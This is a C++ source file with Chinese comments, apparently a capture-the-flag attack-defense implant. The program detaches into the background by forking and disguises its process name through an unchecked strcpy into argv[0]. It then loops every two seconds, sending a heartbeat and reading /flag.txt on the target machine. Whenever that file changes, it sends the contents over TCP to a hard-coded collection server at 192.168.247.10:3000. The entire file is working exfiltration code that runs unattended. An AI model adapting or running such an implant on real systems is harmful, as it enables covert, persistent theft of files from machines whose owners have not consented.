#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#include <iostream>
#include <fstream>
#include <string>
#include <ctime>

#include <string.h>
using namespace std;

//服务器IP
string dst_host = "192.168.247.10";
//服务器端口
uint16_t dst_port = 3000;
//靶机flag文件位置
string flag_path = "/flag.txt";

/*===============================================================================
*将内容发送到指定的服务器
*parm flag: 要发送的内容
*retn : 无
===============================================================================*/
void send_flag(string flag)
{
	int socket_fd = socket(AF_INET, SOCK_STREAM, 0);

	sockaddr_in dst_addr = {};
	dst_addr.sin_family = AF_INET;
	dst_addr.sin_port = htons(dst_port);
	inet_pton(AF_INET, dst_host.c_str(), &dst_addr.sin_addr.s_addr);

	if(connect(socket_fd, (sockaddr *)&dst_addr, sizeof(sockaddr_in)))
	{
		cout << "connect error" << endl;
		close(socket_fd);
		return;
	}

	ssize_t sended_bytes = send(socket_fd, flag.c_str(), flag.length(), 0);
	cout << "sended length: " << sended_bytes << " || " << flag << endl;
	close(socket_fd);
}

/*===============================================================================
 *发送心跳包，发送的内容为当前时间
 *retn : 无
===============================================================================*/
void heartbeat()
{
	int socket_fd = socket(AF_INET, SOCK_STREAM, 0);

    sockaddr_in dst_addr = {};
    dst_addr.sin_family = AF_INET;
    dst_addr.sin_port = htons(dst_port); 
    inet_pton(AF_INET, dst_host.c_str(), &dst_addr.sin_addr.s_addr);
    
    if(connect(socket_fd, (sockaddr *)&dst_addr, sizeof(sockaddr_in)))
    {   
        cout << "connect error" << endl;
        close(socket_fd);
    }
 	time_t unix_time = time(nullptr);
	string message = asctime(localtime(&unix_time)); 
    send(socket_fd, message.c_str(), message.length(), 0);
   
	close(socket_fd);
}


 /*===============================================================================
  *
  *retn : 无
 ===============================================================================*/
string flag_check(string source)
{
	
	fstream file(flag_path ,fstream::in);
	string buffer;
	file >> buffer;
	file.close();

	if(buffer.compare(source))
	{
		send_flag(buffer);
	}
	return buffer;
}

/*===============================================================================
 *每两秒查看flag是否发生变化，并发送心跳包。如果发生变化则将flag发送到服务器
 *retn : 0
 *===============================================================================*/
int main(int argc, char *argv[])
{
	if(fork())
	{
		return 0;
	}

	string process_name = "hacktool";
	//unknow length of argv[0]. May cause overflow but everything seems fine...
	strcpy(argv[0], process_name.c_str());

	string flag = "";
	while(true)
	{
		heartbeat();
		flag = flag_check(flag);

		sleep(2);
	}		
	return 0;
}
